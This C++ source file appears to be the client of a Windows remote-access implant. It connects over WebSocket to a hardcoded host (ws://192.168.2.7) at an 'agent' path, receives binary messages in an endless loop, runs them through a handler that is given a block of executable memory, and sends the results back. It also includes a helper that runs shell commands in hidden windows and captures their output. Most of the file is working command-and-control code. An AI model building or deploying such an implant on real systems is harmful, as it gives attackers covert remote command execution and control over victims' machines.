#include "global.hpp"
#include "connection.hpp"
#include "identifier.hpp"

//#define DEBUG
#ifdef DEBUG
#include <iostream>
using namespace std;
#endif

PVOID getMem(SIZE_T size, DWORD dwProtect);

PVOID scratchpad;

bool handleMessage(
    const char* input,
    size_t inputSize,
    char* output,
    size_t outputCapacity,
    size_t& outputSize,
    PVOID execution_mem
);

#include <windows.h>

char* runCommand(const char* cmd) {
    HANDLE hRead = NULL;
    HANDLE hWrite = NULL;

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    // create pipe
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return NULL;
    }

    // prevent read handle from being inherited
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    char bufferCmd[1024];
    lstrcpynA(bufferCmd, cmd, 1024);

    BOOL ok = CreateProcessA(
        NULL,
        bufferCmd,
        NULL,
        NULL,
        TRUE,               // must be TRUE for pipe inheritance
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!ok) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return NULL;
    }

    CloseHandle(hWrite); // parent doesn't need write end

    // read output
    char tmp[4096];
    DWORD bytesRead;

    // allocate initial buffer
    size_t capacity = 8192;
    size_t size = 0;
    char* output = (char*)HeapAlloc(GetProcessHeap(), 0, capacity);
    if (!output) {
        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    while (ReadFile(hRead, tmp, sizeof(tmp), &bytesRead, NULL) && bytesRead > 0) {
        // grow buffer if needed
        if (size + bytesRead + 1 > capacity) {
            capacity *= 2;
            char* newBuf = (char*)HeapReAlloc(GetProcessHeap(), 0, output, capacity);
            if (!newBuf) break;
            output = newBuf;
        }

        CopyMemory(output + size, tmp, bytesRead);
        size += bytesRead;
    }

    output[size] = '\0';

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(hRead);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return output;
}

int main() {
    //DebugBreak();
    //char command[] = "whoami";
    //char *output = runCommand(command);
    PVOID mem = getMem(0x1000, PAGE_EXECUTE_READWRITE);
    scratchpad = getMem(0x100000, PAGE_READWRITE);

    const char* host = "ws://192.168.2.7";

    char identifier[37];
    random_uuid(identifier);

    char path[128];
    const char* basePath = "/api/v1/anon/agent/ws/";

    size_t baseLen = strlen(basePath);
    size_t idLen = strlen(identifier);

    if (baseLen + idLen + 1 > sizeof(path) / sizeof(wchar_t)) {
        return 1;
    }
    strcpy(path, host);
    strcat(path, basePath);
    strcat(path, identifier);

    WebSocketClient client = {};

    if (!connectWebSocket(client, path)) {
        return 1;
    }
    size_t MESSAGE_BUFFER_SIZE = 0x1000;
    size_t RESPONSE_BUFFER_SIZE = 0x100000;
    char *messageBuffer = new char[MESSAGE_BUFFER_SIZE];
    char *responseBuffer = new char[RESPONSE_BUFFER_SIZE];
    size_t messageSize = 0;
    size_t responseSize = 0;

    while (true) {
        if (!receiveBinary(
                client,
                messageBuffer,
                MESSAGE_BUFFER_SIZE,
                messageSize)) {
            #ifdef DEBUG
            cout << "Error receiving." << endl;
            #endif
            break;
        }
        #ifdef DEBUG
        cout << "Received" << messageBuffer << endl;
        #endif
        
        if (!handleMessage(
                messageBuffer,
                messageSize,
                responseBuffer,
                RESPONSE_BUFFER_SIZE,
                responseSize,
                mem)) {
                    #ifdef DEBUG
            cout << "Error handling message." << endl;
            #endif
            break;
        }

        if (!sendBinary(client, responseBuffer, responseSize)) {
            #ifdef DEBUG
            cout << "Error sending." << endl;
            #endif
            break;
        }
    }

    return 0;
}